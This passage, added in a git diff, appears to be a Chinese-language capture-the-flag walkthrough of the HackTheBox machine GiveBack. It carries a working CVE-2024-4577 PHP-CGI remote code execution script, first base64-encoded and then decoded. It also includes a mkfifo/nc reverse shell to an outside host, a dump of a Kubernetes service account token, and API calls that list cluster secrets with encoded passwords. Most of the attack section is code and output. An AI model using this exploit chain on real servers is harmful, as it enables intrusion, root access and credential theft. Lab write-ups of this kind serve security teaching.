@@ -1861,3 +1861,385 @@ This program is free software; you can redistribute it and/or modify it under th
 ```
 </details>
 
+#### 保存这段HTML代码，然后在Firefox浏览器中打开它：
+```
+[★]$ vi debug.html
+[★]$ firefox debug.html
+```
+![图片](images/2026032504.png)
+#### 这台服务器运行的是 CGI 程序。此页面显示的 PHP CGI 版本为 8.3.3
+#### CVE-2024-4577
+https://nvd.nist.gov/vuln/detail/cve-2024-4577
+```
+在 PHP 版本 8.1.*（8.1.29 之前）、8.2.*（8.2.20 之前）和 8.3.*（8.3.8 之前）中，当在 Windows 系统上使用 Apache 和 PHP-CGI 时，如果系统配置为使用特定的代码页，Windows 可能会使用“最佳匹配”机制来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码、在服务器上运行任意 PHP 代码等等。
+```
+#### 这有点奇怪，因为 GiveBack 显然不是 Windows 系统。不过，页面底部有一段文字写道：
+#### 在php -r "echo file_get_contents('http://10.43.2.241:5000/');"的底部
+```
+<p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.
+    During migration to Linux, the Windows-style CGI handling was retained to ensure
+    legacy scripts continued to function without modification.</p>
+
+<p>此内容管理系统最初是在 Windows IIS 上使用 <code>php-cgi.exe</code> 进行部署的。
+在迁移到 Linux 系统的过程中，保留了 Windows 式的 CGI 处理方式，以确保遗留脚本无需修改即可继续正常运行。</p>
+```
+#### 著名研究员蔡橙（Orange Tsai）发布的这份公告对此进行了更详细的说明。此 CVE 漏洞绕过了CVE-2012-1823的修复。简而言之，某些 Windows 字符集允许 PHP-CGI 参数注入，而该漏洞已在很久以前的 CVE-2012-1823 中得到修复。
+https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv
+```
+如果攻击者将-`to`改为 ` %ad，则会绕过补丁并注入代码-s以显示 PHP 源代码……
+
+http://server/index.php?%ads
+```
+https://nvd.nist.gov/vuln/detail/cve-2012-1823
+```
+在 PHP 5.3.12 之前的版本和 5.4.x 版本（5.4.2 之前的版本）中，sapi/cgi/cgi_main.c 在配置为 CGI 脚本（又名 php-cgi）时，无法正确处理缺少 =（等号）字符的查询字符串，这使得远程攻击者可以通过在查询字符串中放置命令行选项来执行任意代码，这与未跳过 'd' 情况下的某些 php_getopt 有关
+```
+### POC 概念验证
+#### 我打算以它为目标/cgi-bin/php-cgi，因为它看起来像是一个典型的 CGI 脚本。正常运行后，它只会输出“OK”：
+```
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php -r "echo file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi');"                     
+OK
+```
+#### 我需要向这个脚本发送请求，并使用该%AD命令注入 PHP 参数。我的漏洞利用方法很简单curl（我可以直接在这里建立隧道），但我将使用 PHP 来实现，编写以下脚本/tmp/rce.php：
+```
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ echo PD9waHAKJGNtZCA9ICRhcmd2WzFdID8/ICJpZCI7CiR1cmwgPSAiaHR0cDovLzEwLjQzLjIuMjQxOjUwMDAvY2dpLWJpbi9waHAtY2dpPyVBRGQrYXV0b19wcmVwZW5kX2ZpbGUlM0RwaHAlM0ElMkYlMkZpbnB1dCI7CiRjdHggPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoWyJodHRwIiA9PiBbCiAgICAibWV0aG9kIiA9PiAiUE9TVCIsCiAgICAiaGVhZGVyIiA9PiAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLAogICAgImNvbnRlbnQiID0+ICRjbWQKXV0pOwokciA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY3R4KTsKZWNobyAkcjsKPz4K | base64 -d > /tmp/rce.php
+```
+#### 解码后为：
+```
+<?php
+$cmd = $argv[1] ?? "id";
+$url = "http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput";
+$ctx = stream_context_create(["http" => [
+    "method" => "POST",
+    "header" => "Content-Type: application/x-www-form-urlencoded",
+    "content" => $cmd
+]]);
+$r = file_get_contents($url, false, $ctx);
+echo $r;
+?>
+```
+#### 漏洞存在于 URL 中。`--`%AD是 Windows 系统中的“最佳匹配”字符，它映射到-一个短横线（`--`），从而绕过了 CVE-2012-1823 的修复（该修复会阻止-查询字符串中的字面值）。这使得攻击者可以注入 PHP-CGI 参数-d auto_prepend_file=php://input，该参数指示 PHP 在目标脚本运行之前将 POST 请求体作为 PHP 代码执行。该命令可以作为参数传递，也可以id默认运行：
+```
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php
+[START]uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+[END]
+```
+#### 服务器肯定添加了某些[START]东西[END]（我不确定为什么）。总之，这就是远程代码执行！
+### Shell
+#### bash反向 shell无法工作，一些枚举结果表明，bash目标旧版 pod 上没有安装 bash：
+```
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php 'which bash'      
+[START][END]
+```
+#### nc已经安装了，所以我将使用管道反向 shell：
+```
+[★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+```
+```
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.44 443 >/tmp/f'
+```
+#### 获得了 root 权限的 shell：
+#### 使用标准方法升级 shell （但使用 `--install`sh而bash不是 `--install`，因为它尚未安装）：
+```
+[★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.15.139] from (UNKNOWN) [10.129.242.171] 32401
+/bin/sh: can't access tty; job control turned off
+/var/www/html/cgi-bin # script /dev/null -c sh
+Script started, output log file is '/dev/null'.
+/var/www/html/cgi-bin # ^[[22;25R^Z
+[1]+  Stopped                 sudo nc -lvnp 443
+┌─[us-dedivip-4]─[10.10.15.139]─[syareya55@htb-uwxrnx80zh]─[~]
+└──╼ [★]$ stty raw -echo;fg
+sudo nc -lvnp 443
+                 reset
+/var/www/html/cgi-bin #
+```
+### Shell as babywyrm
+#### Enumeration 枚举
+#### 这个 pod 有一个不同的主机名，但也遵循 K8s pod 格式：
+```
+/var/www/html/cgi-bin # hostname
+legacy-intranet-cms-6f7bf5db84-gb975
+```
+#### start.sh根目录下有一个：
+```
+/var/www/html/cgi-bin # cd /
+/ # ls
+bin       home      mnt       root      srv       tmp
+dev       lib       opt       run       start.sh  usr
+etc       media     proc      sbin      sys       var
+/ # cat start.sh
+#!/bin/sh
+echo "🚀 Starting REAL php-cgi..."
+
+mkdir -p /var/run
+spawn-fcgi -s /var/run/php-cgi.socket -U nginx -G nginx \
+          -- /usr/local/bin/php-cgi
+chmod 666 /var/run/php-cgi.socket
+echo "✅ php-cgi.socket ready"
+ls -la /var/run/php-cgi.socket
+
+echo "🌐 Starting nginx..."
+nginx -g "daemon off;"
+```
+#### 没有/secrets，但有一个secrets目录/var/run：
+```
+/var/run # ls
+nginx           nginx.pid       php-cgi.socket  secrets
+/var/run # cd secrets
+/var/run/secrets # ls
+kubernetes.io
+/var/run/secrets # cd Kubernetes.io
+sh: cd: can't cd to Kubernetes.io: No such file or directory
+/var/run/secrets # cd kubernetes.io
+/var/run/secrets/kubernetes.io # ls
+serviceaccount
+/var/run/secrets/kubernetes.io # cd serviceaccount
+/var/run/secrets/kubernetes.io/serviceaccount # ls
+ca.crt     namespace  token
+/var/run/secrets/kubernetes.io/serviceaccount # cat token
+eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODA1OTgwNDA0LCJpYXQiOjE3NzQ0NDQ0MDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMDk2NDI5MjQtZDRmMS00N2EwLThlMTgtM2RhNGNmNDc0NDkzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWdiOTc1IiwidWlkIjoiMDc5NDAzMjMtNjMyYi00NDA5LTkxMWItYzJmZmExZmJkY2E5In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc3NDQ0ODAxMX0sIm5iZiI6MTc3NDQ0NDQwNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.CQkC-29E_XN7T6FhJ5MYsF3fuAUuo9PnbZadWpu9iz1CrOALFtAPi-aZK7Mpga-cWQ8OTIe6tre6cxaCQipqE3g2Yjcf80qEs-IukvVltcv5T3NnaDGRPDwJeexopndRiNwnJn9tan2LgB1vydTzQp0YErSGpFxu5nowI3t-_wd2TzGPoWm9scyn0OFuZpPDrw1MdK8tOvsHvqVFoNN315XcM14DCwlYTJT79YCV_-gDLr-X3oUHw1vBVWwn5RmCP982acDawa4SKQO1oIkxAMGfudn9OfqSC340kGYYMKEGjj5DfSv4dTiuTsqlp4Nu8udmHrB7Qekp_YKTvthOfQ
+
+/ # cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+-----BEGIN CERTIFICATE-----
+MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
+dmVyLWNhQDE3MjY5Mjc3MjMwHhcNMjQwOTIxMTQwODQzWhcNMzQwOTE5MTQwODQz
+WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE3MjY5Mjc3MjMwWTATBgcqhkjO
+PQIBBggqhkjOPQMBBwNCAATWYWOnIUmDn8DGHOdKLjrOZ36gSUMVrnqqf6YJsvpk
+9QbgzGNFzYcwDZxmZtJayTbUrFFjgSydDNGuW/AkEnQ+o0IwQDAOBgNVHQ8BAf8E
+BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUtCpVDbK3XnBv3N3BKuXy
+Yd0zeicwCgYIKoZIzj0EAwIDSAAwRQIgOsFo4UipeXPiEXvlGH06fja8k46ytB45
+cd0d39uShuQCIQDMgaSW8nrpMfNExuGLMZhcsVrUr5XXN8F5b/zYi5snkQ==
+-----END CERTIFICATE-----
+
+/ # cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 
+default/
+```
+```
+/var/run/secrets/kubernetes.io/serviceaccount/这是默认的 Kubernetes 服务帐户挂载点，它会自动添加到每个 Pod 中（除非显式地使用 `automountServiceAccountToken: false` 禁用）。相关文件如下：
+
+token- 用于对 K8s API 进行身份验证的 JWT
+ca.crt- 集群 CA 证书
+namespace- pod 的命名空间
+我可以用这些文件与 Kubernetes API 进行交互。文件系统的其余部分都是空的
+```
+### K8s API | Authentication验证
+#### HackTricks网站上有一个页面展示了如何使用这些值来curl访问API：
+https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/kubernetes-enumeration.html#using-curl
+```
+/ # export APISERVER=10.43.0.1:443
+/ # export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
+/ # export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
+/ # export TOKEN=$(cat ${SERVICEACCOUNT}/token)
+/ # export CACERT=${SERVICEACCOUNT}/ca.crt
+/ # alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
+```
+#### 如果我尝试在没有此配置的情况下访问 API，则会失败：
+```
+/ # curl https://$APISERVER/api -k
+curl: (6) Could not resolve host: api
+
+/ # export APISERVER=10.43.0.1:443
+/ # export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
+/ #  export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
+/ # export TOKEN=$(cat ${SERVICEACCOUNT}/token)
+/ # export CACERT=${SERVICEACCOUNT}/ca.crt
+/ # alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN
+}\""
+/ # curl https://$APISERVER/api -k
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "Unauthorized",
+  "reason": "Unauthorized",
+  "code": 401
+}/ #
+```
+#### 但使用kurl（配置为使用tokenand ca-cert）：
+```
+/ # kurl https://$APISERVER/api
+{
+  "kind": "APIVersions",
+  "versions": [
+    "v1"
+  ],
+  "serverAddressByClientCIDRs": [
+    {
+      "clientCIDR": "0.0.0.0/0",
+      "serverAddress": "10.129.242.171:6443"
+    }
+  ]
+}
+```
+### 枚举
+#### 此令牌无法列出正在运行的 Pod：
+```
+/ # kurl https://$APISERVER/api/v1/namespaces/$NS/pods
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "pods is forbidden: User \"system:serviceaccount:default:secret-reader-sa\" cannot list resource \"pods\" in API group \"\" at the cluster scope",
+  "reason": "Forbidden",
+  "details": {
+    "kind": "pods"
+  },
+  "code": 403
+}
+```
+#### 它显示了账户名称“secret-reader-sa”，这为下一步查找提供了很好的线索。我会检查是否有秘密信息：
+
+<details>
+<summary>/ # kurl https://$APISERVER/api/v1/namespaces/default/secrets</summary>
+
+```
+{
+  "kind": "SecretList",
+  "apiVersion": "v1",
+  "metadata": {
+    "resourceVersion": "2865292"
+  },
+  "items": [
+    {
+      "metadata": {
+        "name": "beta-vino-wp-mariadb",
+        "namespace": "default",
+        "uid": "3473d5ec-b774-40c9-a249-81d51426a45e",
+        "resourceVersion": "2088227",
+        "creationTimestamp": "2024-09-21T22:17:31Z",
+        "labels": {
+          "app.kubernetes.io/instance": "beta-vino-wp",
+          "app.kubernetes.io/managed-by": "Helm",
+          "app.kubernetes.io/name": "mariadb",
+          "app.kubernetes.io/part-of": "mariadb",
+          "app.kubernetes.io/version": "11.8.2",
+          "helm.sh/chart": "mariadb-21.0.0"
+        },
+        "annotations": {
+          "meta.helm.sh/release-name": "beta-vino-wp",
+          "meta.helm.sh/release-namespace": "default"
+        },
+        "managedFields": [
+          {
+            "manager": "helm",
+            "operation": "Update",
+            "apiVersion": "v1",
+            "time": "2025-08-29T03:29:54Z",
+            "fieldsType": "FieldsV1",
+            "fieldsV1": {
+              "f:data": {
+                ".": {},
+                "f:mariadb-password": {},
+                "f:mariadb-root-password": {}
+              },
+              "f:metadata": {
+                "f:annotations": {
+                  ".": {},
+                  "f:meta.helm.sh/release-name": {},
+                  "f:meta.helm.sh/release-namespace": {}
+                },
+                "f:labels": {
+                  ".": {},
+                  "f:app.kubernetes.io/instance": {},
+                  "f:app.kubernetes.io/managed-by": {},
+                  "f:app.kubernetes.io/name": {},
+                  "f:app.kubernetes.io/part-of": {},
+                  "f:app.kubernetes.io/version": {},
+                  "f:helm.sh/chart": {}
+                }
+              },
+              "f:type": {}
+            }
+          }
+        ]
+      },
+      "data": {
+        "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
+        "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
+      },
+      "type": "Opaque"
+    },
+    {
+      "metadata": {
+        "name": "beta-vino-wp-wordpress",
+        "namespace": "default",
+        "uid": "1cbbc5ac-1611-46af-8033-09e98dfc546b",
+        "resourceVersion": "2088228",
+        "creationTimestamp": "2024-09-21T22:17:31Z",
+        "labels": {
+          "app.kubernetes.io/instance": "beta-vino-wp",
+          "app.kubernetes.io/managed-by": "Helm",
+          "app.kubernetes.io/name": "wordpress",
+          "app.kubernetes.io/version": "6.8.2",
+          "helm.sh/chart": "wordpress-25.0.5"
+        },
+        "annotations": {
+          "meta.helm.sh/release-name": "beta-vino-wp",
+          "meta.helm.sh/release-namespace": "default"
+        },
+        "managedFields": [
+          {
+            "manager": "helm",
+            "operation": "Update",
+            "apiVersion": "v1",
+            "time": "2025-08-29T03:29:54Z",
+            "fieldsType": "FieldsV1",
+            "fieldsV1": {
+              "f:data": {
+                ".": {},
+                "f:wordpress-password": {}
+              },
+              "f:metadata": {
+                "f:annotations": {
+                  ".": {},
+                  "f:meta.helm.sh/release-name": {},
+                  "f:meta.helm.sh/release-namespace": {}
+                },
+                "f:labels": {
+                  ".": {},
+                  "f:app.kubernetes.io/instance": {},
+                  "f:app.kubernetes.io/managed-by": {},
+                  "f:app.kubernetes.io/name": {},
+                  "f:app.kubernetes.io/version": {},
+                  "f:helm.sh/chart": {}
+                }
+              },
+              "f:type": {}
+            }
+          }
+        ]
+      },
+      "data": {
+        "wordpress-password": "TzhGN0tSNXpHaQ=="
+      },
+      "type": "Opaque"
+    },
+...[/SNIP]...
+```
+</details>
+
+
+#### 很多
+#### 将用它jq来获取名称和可用密钥：
+```
+/ # kurl https://$APISERVER/api/v1/namespaces/default/secrets -s | jq '.items[] | {name:.metadata.name, keys: (.data | keys)}' -c
+{"name":"beta-vino-wp-mariadb","keys":["mariadb-password","mariadb-root-password"]}
+{"name":"beta-vino-wp-wordpress","keys":["wordpress-password"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v58","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v59","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v60","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v61","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v62","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v63","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v64","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v65","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v66","keys":["release"]}
+{"name":"sh.helm.release.v1.beta-vino-wp.v67","keys":["release"]}
+{"name":"user-secret-babywyrm","keys":["MASTERPASS"]}
+```
+#### 这些sh.helm.release是产品发布博客，篇幅很长，对我来说没什么用。我会去获取其他数据：
